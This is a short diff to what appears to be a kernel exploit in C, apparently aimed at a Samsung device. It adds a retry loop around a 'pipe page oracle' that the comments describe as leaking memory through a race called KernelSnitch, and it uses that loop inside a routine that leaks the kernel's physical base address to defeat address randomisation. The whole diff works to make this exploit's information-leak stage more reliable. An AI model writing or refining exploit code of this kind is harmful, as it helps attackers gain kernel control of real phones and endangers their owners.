@@ -1966,6 +1966,19 @@ int app_trigger_fops_slide_route(void) {
 }
 #endif
 
+/* The pipe page oracle still leaks its page through KernelSnitch, a race that
+   can miss the mm_struct entirely on some boots. */
+static int prepare_p0_pipe_oracle_retry(void) {
+  for (int attempt = 1; attempt <= 3; attempt++) {
+    if (prepare_p0_pipe_oracle()) {
+      return 1;
+    }
+    pr_warning("p0 pipe oracle attempt=%d/3 failed\n", attempt);
+    reset_pipe_attempt();
+  }
+  return 0;
+}
+
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
@@ -1985,7 +1998,7 @@ static int slide_leak_physical_base(void) {
     pr_warning("slide tracefs pre-oracle unavailable; using physical scan\n");
   }
 #endif
-  if (!prepare_p0_pipe_oracle()) {
+  if (!prepare_p0_pipe_oracle_retry()) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
@@ -2009,7 +2022,7 @@ static int slide_leak_physical_base(void) {
     APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE
     if (refresh_oracle) {
       reset_pipe_attempt();
-      if (!prepare_p0_pipe_oracle()) {
+      if (!prepare_p0_pipe_oracle_retry()) {
         pr_error("p0 physical pipe refresh failed fresh=%d/%d\n",
                  fresh_attempt, fresh_page_attempts);
         return 0;
